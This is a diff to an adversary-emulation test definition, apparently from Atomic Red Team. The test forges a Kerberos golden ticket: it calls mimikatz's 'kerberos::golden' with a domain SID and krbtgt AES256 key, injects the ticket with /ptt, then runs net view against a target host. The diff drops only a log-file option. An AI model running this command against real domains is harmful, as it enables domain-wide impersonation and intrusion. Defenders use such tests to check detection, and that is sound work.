@@ -29,10 +29,6 @@ atomic_tests:
       description: machine to target (without domain suffix) with crafted golden ticket
       type: string
       default: server
-    output_file:
-      description: Output file
-      type: path
-      default: '%tmp%\mimikatz\x64\mimikatz.log'
     mimikatz_path:
       description: Mimikatz windows executable
       type: path
@@ -55,8 +51,7 @@ atomic_tests:
     elevation_required: false
     command: |
       klist purge
-      #{mimikatz_path} "log #{output_file}" "kerberos::golden /domain:#{domain} /sid:#{domain_sid} /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt" "exit"
+      #{mimikatz_path} "kerberos::golden /domain:#{domain} /sid:#{domain_sid} /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt" "exit"
       net view \\#{machine}.#{domain}
     cleanup_command: |
       klist purge
-      del #{output_file}
